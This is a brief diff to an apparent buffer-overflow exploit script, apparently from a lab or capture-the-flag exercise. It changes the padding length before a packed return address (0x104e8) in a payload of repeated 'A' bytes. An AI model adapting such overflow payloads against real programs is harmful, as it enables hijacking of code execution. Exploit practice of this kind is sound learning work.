@@ -1,6 +1,6 @@
 import struct
 
-padding = 300
+padding = 312
 target  = 0x104e8        
 
 payload = b'A' * padding + struct.pack('<I', target)
